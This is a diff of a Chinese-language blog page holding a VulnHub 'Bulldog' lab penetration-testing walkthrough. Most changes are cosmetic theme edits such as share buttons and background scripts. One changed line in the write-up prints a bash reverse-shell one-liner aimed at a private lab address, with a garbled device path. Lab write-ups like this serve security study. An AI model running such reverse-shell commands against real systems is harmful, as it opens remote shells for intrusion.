@@ -379,6 +379,9 @@
         <hr class="clearfix">
 
         
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
+        
 
         
 
@@ -452,7 +455,7 @@
 <p><img src="/2020/vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95(%E4%B8%80)bulldog/10.png"></p>
 </div>
 
-<p>最后利用echo使用<code>echo “bash -i &gt;&amp; /dev/etc/192.168.0.7/1235 0&gt;&amp;1” | bash</code>成功进行反弹。</p>
+<p>最后利用echo使用<code>echo “bash -i &gt;&amp; /dev/etc/192.168.0.7/12345 0&gt;&amp;1” | bash</code>成功进行反弹。</p>
 <div align="center">
 
 <p><img src="/2020/vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95(%E4%B8%80)bulldog/11.png"></p>
@@ -563,7 +566,7 @@
 <div id="article-share">
 
     
-    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <div class="social-share" data-sites="qq,qzone,wechat,weibo" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
     <script src="/libs/share/js/social-share.min.js"></script>
     
 
@@ -1094,7 +1097,16 @@ $(function () {
     <!--腾讯兔小巢-->
     
     
+    <script type="text/javascript" color="0,0,255"
+        pointColor="0,0,255" opacity='0.4'
+        zIndex="-1" count="99"
+        src="/libs/background/canvas-nest.js"></script>
+    
 
+    
+    
+    <script type="text/javascript" size="150" alpha='0.6'
+        zIndex="-1" src="/libs/background/ribbon-refresh.min.js" async="async"></script>
     
 
     
